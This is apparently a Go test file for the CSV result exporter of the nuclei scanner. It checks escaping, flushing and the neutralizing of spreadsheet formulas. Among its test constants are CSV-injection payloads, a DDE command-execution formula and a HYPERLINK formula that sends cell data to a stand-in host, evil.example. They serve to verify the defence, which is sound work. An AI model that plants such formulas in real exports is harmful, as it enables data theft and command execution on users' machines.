package csv

import (
	encodingcsv "encoding/csv"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/require"

	"github.com/projectdiscovery/nuclei/v3/pkg/model"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/severity"
	"github.com/projectdiscovery/nuclei/v3/pkg/model/types/stringslice"
	"github.com/projectdiscovery/nuclei/v3/pkg/output"
)

// readCSV is a small helper that fully parses the exporter output back into
// records so assertions are made against decoded CSV rather than raw bytes.
func readCSV(t *testing.T, path string) [][]string {
	t.Helper()
	f, err := os.Open(path)
	require.NoError(t, err)
	defer func() { _ = f.Close() }()

	records, err := encodingcsv.NewReader(f).ReadAll()
	require.NoError(t, err)
	return records
}

// column resolves a header name to its index so assertions do not depend on
// the ordinal position of a column.
func column(t *testing.T, name string) int {
	t.Helper()
	for i, h := range header {
		if h == name {
			return i
		}
	}
	t.Fatalf("unknown CSV column %q", name)
	return -1
}

// export writes a single event through the exporter and returns the decoded
// records (header row included).
func export(t *testing.T, event *output.ResultEvent) [][]string {
	t.Helper()
	file := filepath.Join(t.TempDir(), "results.csv")

	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Export(event))
	require.NoError(t, exporter.Close())

	return readCSV(t, file)
}

func TestCSVExporterWritesHeaderAndFlattenedRows(t *testing.T) {
	ts := time.Date(2025, 1, 2, 3, 4, 5, 0, time.UTC)
	event := &output.ResultEvent{
		TemplateID: "CVE-2021-44228",
		Type:       "http",
		Info: model.Info{
			Name:           "Apache Log4j2 Remote Code Execution",
			Description:    "Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints.",
			Reference:      stringslice.NewRawStringSlice([]string{"https://logging.apache.org/log4j/2.x/security.html"}),
			SeverityHolder: severity.Holder{Severity: severity.Critical},
			Classification: &model.Classification{
				CVEID:       stringslice.StringSlice{Value: "CVE-2021-44228"},
				CWEID:       stringslice.StringSlice{Value: "CWE-502"},
				CVSSMetrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
				CVSSScore:   10.0,
			},
		},
		Host:             "https://example.com",
		IP:               "93.184.216.34",
		Port:             "443",
		Matched:          "https://example.com/api",
		MatcherName:      "jndi-ldap",
		ExtractorName:    "version",
		ExtractedResults: []string{"2.14.1"},
		CURLCommand:      "curl -X 'GET' 'https://example.com/api'",
		Timestamp:        ts,
	}

	records := export(t, event)
	require.Len(t, records, 2, "expected header + one data row")
	require.Equal(t, header, records[0])
	require.Equal(t, []string{
		"CVE-2021-44228",
		"Apache Log4j2 Remote Code Execution",
		"http",
		"critical",
		"https://example.com",
		"93.184.216.34",
		"443",
		"https://example.com/api",
		"jndi-ldap",
		"version",
		"2.14.1",
		"CVE-2021-44228",
		"CWE-502",
		"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
		"10",
		"Apache Log4j2 JNDI features do not protect against attacker controlled LDAP endpoints.",
		"https://logging.apache.org/log4j/2.x/security.html",
		"curl -X 'GET' 'https://example.com/api'",
		"2025-01-02T03:04:05Z",
	}, records[1])
}

func TestCSVExporterHandlesMissingClassification(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID: "tech-detect",
		Type:       "http",
		Info: model.Info{
			Name:           "Wappalyzer Technology Detection",
			SeverityHolder: severity.Holder{Severity: severity.Info},
		},
		Host:      "example.org",
		Matched:   "example.org",
		Timestamp: time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	records := export(t, event)
	require.Len(t, records, 2)
	// classification-derived and reference columns must be empty, not "0" or
	// "<nil>", when the template carries no such metadata.
	for _, name := range []string{"cve-id", "cwe-id", "cvss-metrics", "cvss-score", "reference", "description"} {
		require.Equal(t, "", records[1][column(t, name)], "column %s should be empty", name)
	}
	require.Equal(t, "info", records[1][column(t, "severity")])
	// every row still carries exactly one cell per header column
	require.Len(t, records[1], len(header))
}

// TestCSVExporterEscapesStructuralCharacters is the reason this exporter writes
// through encoding/csv rather than leaving CSV assembly to the consumer: every
// value below is attacker-influenced and contains characters that are
// structural in CSV. A hand-rolled join (jq's @csv on a subset of fields, an
// fmt.Sprintf with commas, ...) either forges extra columns or truncates a row.
// Here the values must survive a full write/parse round trip byte for byte and
// the row must keep exactly len(header) cells.
func TestCSVExporterEscapesStructuralCharacters(t *testing.T) {
	const (
		commaValue   = "a,b,c"
		quoteValue   = `he said "hi", then left`
		newlineValue = "line1\nline2"
		crlfValue    = "line1\r\nline2"
		mixedValue   = "GET /a,b?q=\"x\" HTTP/1.1\r\nHost: evil\n"
	)

	event := &output.ResultEvent{
		TemplateID: commaValue,
		Type:       quoteValue,
		Info: model.Info{
			Name:           mixedValue,
			Description:    newlineValue,
			Reference:      stringslice.NewRawStringSlice([]string{commaValue, quoteValue}),
			SeverityHolder: severity.Holder{Severity: severity.High},
		},
		Host:             quoteValue,
		IP:               commaValue,
		Port:             newlineValue,
		Matched:          mixedValue,
		MatcherName:      crlfValue,
		ExtractorName:    quoteValue,
		ExtractedResults: []string{commaValue, quoteValue, newlineValue},
		CURLCommand:      mixedValue,
		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	file := filepath.Join(t.TempDir(), "results.csv")
	exporter, err := New(&Options{File: file})
	require.NoError(t, err)
	require.NoError(t, exporter.Export(event))
	require.NoError(t, exporter.Close())

	// 1. the raw file must quote the cells and double the embedded quotes
	raw, err := os.ReadFile(file)
	require.NoError(t, err)
	require.Contains(t, string(raw), `"a,b,c"`)
	require.Contains(t, string(raw), `"he said ""hi"", then left"`)

	// 2. the file must still parse as exactly two records of len(header) cells,
	//    i.e. no injected/forged columns and no truncated row
	records := readCSV(t, file)
	require.Len(t, records, 2)
	require.Len(t, records[0], len(header))
	require.Len(t, records[1], len(header))

	// 3. every value must round trip unchanged. encoding/csv collapses a \r\n
	//    inside a quoted field to \n when reading it back, so the expectation is
	//    normalised the same way; nothing else about the value may change.
	lf := func(s string) string { return strings.ReplaceAll(s, "\r\n", "\n") }

	row := records[1]
	require.Equal(t, commaValue, row[column(t, "template-id")])
	require.Equal(t, quoteValue, row[column(t, "template-type")])
	require.Equal(t, lf(mixedValue), row[column(t, "template-name")])
	require.Equal(t, quoteValue, row[column(t, "host")])
	require.Equal(t, commaValue, row[column(t, "ip")])
	require.Equal(t, newlineValue, row[column(t, "port")])
	require.Equal(t, lf(mixedValue), row[column(t, "matched-at")])
	require.Equal(t, quoteValue, row[column(t, "extractor-name")])
	require.Equal(t, newlineValue, row[column(t, "description")])
	require.Equal(t, lf(mixedValue), row[column(t, "curl-command")])
	require.Equal(t, lf(crlfValue), row[column(t, "matcher-name")])
	require.Equal(t, "high", row[column(t, "severity")])

	// extracted results and references are newline separated inside their single
	// quoted cell, so a value that itself contains a comma stays one value
	require.Equal(t,
		[]string{commaValue, quoteValue, "line1", "line2"},
		strings.Split(row[column(t, "extracted-results")], "\n"))
	require.Equal(t,
		[]string{commaValue, quoteValue},
		strings.Split(row[column(t, "reference")], "\n"))
}

func TestCSVExporterJoinsMultipleCVEsAndCWEs(t *testing.T) {
	event := &output.ResultEvent{
		TemplateID: "multi-cve",
		Type:       "http",
		Info: model.Info{
			Name:           "Multiple CVEs",
			SeverityHolder: severity.Holder{Severity: severity.Medium},
			Classification: &model.Classification{
				CVEID:     stringslice.StringSlice{Value: []string{"CVE-2020-0001", "CVE-2020-0002"}},
				CWEID:     stringslice.StringSlice{Value: []string{"CWE-79", "CWE-80"}},
				CVSSScore: 5.5,
			},
		},
		Host:      "example.net",
		Matched:   "example.net",
		Timestamp: time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	records := export(t, event)
	require.Len(t, records, 2)
	require.Equal(t, "CVE-2020-0001, CVE-2020-0002", records[1][column(t, "cve-id")])
	require.Equal(t, "CWE-79, CWE-80", records[1][column(t, "cwe-id")])
	require.Equal(t, "5.5", records[1][column(t, "cvss-score")])
}

// TestCSVExporterFlushesRowsBeforeClose asserts rows are readable while the
// scan is still running, rather than only after Close.
func TestCSVExporterFlushesRowsBeforeClose(t *testing.T) {
	file := filepath.Join(t.TempDir(), "results.csv")

	exporter, err := New(&Options{File: file})
	require.NoError(t, err)

	event := &output.ResultEvent{
		TemplateID: "streamed",
		Type:       "http",
		Info: model.Info{
			Name:           "Streamed Result",
			SeverityHolder: severity.Holder{Severity: severity.Low},
		},
		Host:      "example.com",
		Matched:   "example.com",
		Timestamp: time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}
	require.NoError(t, exporter.Export(event))

	records := readCSV(t, file)
	require.Len(t, records, 2, "row should be on disk before Close")
	require.Equal(t, "streamed", records[1][column(t, "template-id")])

	require.NoError(t, exporter.Close())
}

// TestCSVExporterNeutralizesSpreadsheetFormulas covers the second half of the
// escaping problem. encoding/csv stops a value from breaking out of its cell,
// but it does not stop a spreadsheet from evaluating that cell as a formula.
// ExtractedResults in particular is raw response-derived data, so a target can
// choose exactly what lands in it.
func TestCSVExporterNeutralizesSpreadsheetFormulas(t *testing.T) {
	const (
		ddePayload       = `=cmd|'/C calc'!A0`
		hyperlinkPayload = `=HYPERLINK("http://evil.example/log?d="&A1,"click")`
		atPayload        = `@SUM(1+1)`
		plusPayload      = `+1+1`
		tabPayload       = "\t=1+1"
		crPayload        = "\r=1+1"
		safeValue        = "http://127.0.0.1:8080/index.html"
		negativeNumber   = "-1"
	)

	event := &output.ResultEvent{
		TemplateID: ddePayload,
		Type:       "http",
		Info: model.Info{
			Name:           atPayload,
			Description:    plusPayload,
			Reference:      stringslice.NewRawStringSlice([]string{safeValue, hyperlinkPayload}),
			SeverityHolder: severity.Holder{Severity: severity.High},
			Classification: &model.Classification{
				CVSSScore: 9.8,
			},
		},
		Host:             tabPayload,
		Matched:          safeValue,
		MatcherName:      crPayload,
		ExtractedResults: []string{safeValue, ddePayload, negativeNumber, hyperlinkPayload},
		CURLCommand:      ddePayload,
		Timestamp:        time.Date(2025, 6, 1, 0, 0, 0, 0, time.UTC),
	}

	records := export(t, event)
	require.Len(t, records, 2)
	row := records[1]
	require.Len(t, row, len(header))

	// every formula-triggering cell is prefixed with a single apostrophe, and
	// the original value is recoverable by removing exactly that apostrophe
	for _, tc := range []struct {
		column string
		want   string
	}{
		{"template-id", ddePayload},
		{"template-name", atPayload},
		{"description", plusPayload},
		{"host", tabPayload},
		{"matcher-name", crPayload},
		{"curl-command", ddePayload},
	} {
		got := row[column(t, tc.column)]
		require.Equal(t, "'"+tc.want, got, "column %s must be neutralized", tc.column)
		require.Equal(t, tc.want, strings.TrimPrefix(got, "'"), "column %s must stay recoverable", tc.column)
	}

	// values that are not formulas are left byte-for-byte alone, so the export
	// does not become littered with apostrophes
	require.Equal(t, safeValue, row[column(t, "matched-at")])
	require.Equal(t, "high", row[column(t, "severity")])
	// a numeric cell stays numeric and sortable rather than becoming text
	require.Equal(t, "9.8", row[column(t, "cvss-score")])

	// multi-value cells are neutralized per element, not just at the start of
	// the cell, because consumers split these cells back apart
	require.Equal(t,
		[]string{safeValue, "'" + ddePayload, negativeNumber, "'" + hyperlinkPayload},
		strings.Split(row[column(t, "extracted-results")], "\n"))
	require.Equal(t,
		[]string{safeValue, "'" + hyperlinkPayload},
		strings.Split(row[column(t, "reference")], "\n"))
}

func TestNeutralizeFormula(t *testing.T) {
	for _, tc := range []struct {
		name  string
		input string
		want  string
	}{
		{"empty", "", ""},
		{"plain text", "nuclei", "nuclei"},
		{"url", "http://example.com/a=b", "http://example.com/a=b"},
		{"equals", "=1+1", "'=1+1"},
		{"plus", "+1+1", "'+1+1"},
		{"at", "@SUM(1)", "'@SUM(1)"},
		{"tab", "\t=1+1", "'\t=1+1"},
		{"carriage return", "\r=1+1", "'\r=1+1"},
		{"negative integer stays numeric", "-1", "-1"},
		{"negative float stays numeric", "-1.5", "-1.5"},
		{"positive signed number stays numeric", "+9.8", "+9.8"},
		{"minus leading text is neutralized", "-cmd|'/C calc'!A0", "'-cmd|'/C calc'!A0"},
		{"leading space is not a trigger", " =1+1", " =1+1"},
		{"already neutralized is left alone", "'=1+1", "'=1+1"},
		{"non-ascii leading rune", "é=1+1", "é=1+1"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			require.Equal(t, tc.want, neutralizeFormula(tc.input))
		})
	}
}
